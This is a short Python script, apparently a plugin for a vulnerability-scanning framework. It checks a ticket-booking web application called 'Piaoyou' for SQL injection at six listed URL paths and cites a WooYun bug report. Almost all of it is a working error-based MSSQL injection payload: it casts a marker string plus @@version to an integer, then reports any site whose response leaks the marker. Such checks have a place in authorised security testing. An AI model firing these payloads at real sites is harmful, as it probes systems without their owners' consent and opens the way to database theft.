#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友机票预订系统6处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0118867
author: Lucifer
description: multi sqli。
'''
import sys
import requests
import warnings
from termcolor import cprint

class piaoyou_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        urls = ["/ser_Hotel/SearchList.aspx?CityCode=1%27",
                "/visa/visa_view.aspx?a=11",
                "/travel/Default.aspx?leixing=11",
                "/hotel/Default.aspx?s=11",
                "/travel/Default.aspx?ecity=%E4%B8%8A%E6%B5%B7&leixing=11",
                "/hotel/Default.aspx?s=11"]
        try:
            noexist = True
            for url in urls:
                vulnurl = self.url + url + "%20AnD%201=CoNvErT(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@version)--"
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"WtFaBcMic" in req.text:
                    cprint("[+]存在票友机票预订系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                    return True, vulnurl, "票友机票预订系统6处SQL注入", vulnurl, req.text
            if noexist:
                cprint("[-]不存在piaoyou_multi_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = piaoyou_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()